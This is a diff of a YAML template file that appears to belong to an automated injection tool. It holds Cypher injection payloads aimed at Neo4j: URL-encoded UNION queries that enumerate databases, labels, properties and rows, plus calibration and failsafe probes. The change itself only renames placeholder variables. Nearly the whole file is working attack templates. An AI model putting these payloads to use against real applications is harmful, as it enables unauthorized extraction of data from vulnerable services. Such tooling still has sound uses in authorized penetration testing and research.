@@ -4,22 +4,22 @@ resource:
   '' AS A LIMIT 0 UNION 
   MATCH (n)
   RETURN DISTINCT 
-      '${LEAD}' 
+      '${lead}' 
       %2b '-'
-      %2b '${ENCLOSE_VALUE_SQL}' 
+      %2b '${enclose_value_sql}' 
       %2b '-' 
-      %2b '${ENCLOSE_VALUE_SQL}' 
+      %2b '${enclose_value_sql}' 
       %2b '-' 
-      %2b '${TRAIL_SQL}'
+      %2b '${trail_sql}'
       
  schema: 
   database: |
    '' AS A LIMIT 0 UNION
    MATCH (n)
    RETURN DISTINCT 
-       '${LEAD}${ENCLOSE_VALUE_SQL}neo4j${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+       '${lead}${enclose_value_sql}neo4j${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
        AS A
-   {limit}
+   ${limit}
    UNION MATCH (n:blah) RETURN n
    
   table: |
@@ -27,80 +27,80 @@ resource:
    CALL db.labels() 
    YIELD label 
    WITH label
-   {limit}
+   ${limit}
    RETURN 
-       '${LEAD}' 
+       '${lead}' 
        %2b reduce(
            b = '', 
            n IN collect(label) | 
                b 
-               %2b '${ENCLOSE_VALUE_SQL}'
+               %2b '${enclose_value_sql}'
                %2b n 
-               %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+               %2b '${separator_qte_sql}0${enclose_value_sql}'
        ) 
-       %2b '${TRAIL_SQL}'
+       %2b '${trail_sql}'
        AS A
    UNION MATCH (n:blah) RETURN n
    
   column: |
    '' AS A LIMIT 0 UNION
-   MATCH (n:${TABLE}) 
+   MATCH (n:${table}) 
    WITH collect(keys(n)) AS attr 
    UNWIND attr AS r 
    WITH DISTINCT r[0] AS d 
    ORDER BY d 
-   {limit}
+   ${limit}
    RETURN 
-       '${LEAD}' 
+       '${lead}' 
        %2b reduce(
            b = '', 
            n IN collect(d) | 
            b 
-           %2b '${ENCLOSE_VALUE_SQL}'
+           %2b '${enclose_value_sql}'
            %2b n
-           %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           %2b '${separator_qte_sql}0${enclose_value_sql}'
        ) 
-   %2b '${TRAIL_SQL}'
+   %2b '${trail_sql}'
    AS A
    UNION MATCH (n:blah) RETURN n
    
   row: 
    query: |
     '' AS A LIMIT 0 UNION
-    MATCH (n:${TABLE})
+    MATCH (n:${table})
     WITH DISTINCT n
-    {limit}
+    ${limit}
     RETURN 
-        '${LEAD}' 
+        '${lead}' 
         %2b reduce(
             b = "", 
             n IN collect(n) | 
             b 
-            %2b '${ENCLOSE_VALUE_SQL}'
-            %2b ${FIELDS}
-            %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+            %2b '${enclose_value_sql}'
+            %2b ${fields}
+            %2b '${separator_qte_sql}0${enclose_value_sql}'
         )
-    %2b '${TRAIL_SQL}'
+    %2b '${trail_sql}'
     AS A
     UNION MATCH (n:blah) RETURN n
    fields: 
-    field: coalesce(n.${FIELD}, '')
+    field: coalesce(n.${field}, '')
     concat: "%2b '%7f' %2b"
     
 strategy: 
  configuration: 
-  slidingWindow: ${INJECTION}
-  limit: skip ${LIMIT} LIMIT 65536
-  failsafe: MATCH (n) RETURN 1337${INDICE}7330%2b1 AS A
+  slidingWindow: ${injection}
+  limit: skip ${limit.value} LIMIT 65536
+  failsafe: MATCH (n) RETURN 1337${indice}7330%2b1 AS A
   calibrator: |
    '' AS A LIMIT 0 UNION 
    MATCH (n) 
    RETURN 
-       '${LEAD}${INDICE}'
+       '${lead}${indice}'
        %2b reduce(
            a = "", 
            nn IN collect(n) | 
-           a %2b "${CALIBRATOR_SQL}"
+           a %2b "${calibrator_sql}"
        )
   limitBoundary: 0
   endingComment: //
@@ -109,6 +109,6 @@ strategy:
     - neo4j
     
  normal: 
-  indices: RETURN 'A' AS A UNION ${INDICES}
-  capacity: ${CALIBRATOR}
+  indices: RETURN 'A' AS A UNION ${indices}
+  capacity: ${calibrator}
   orderBy: ORDER BY 1337
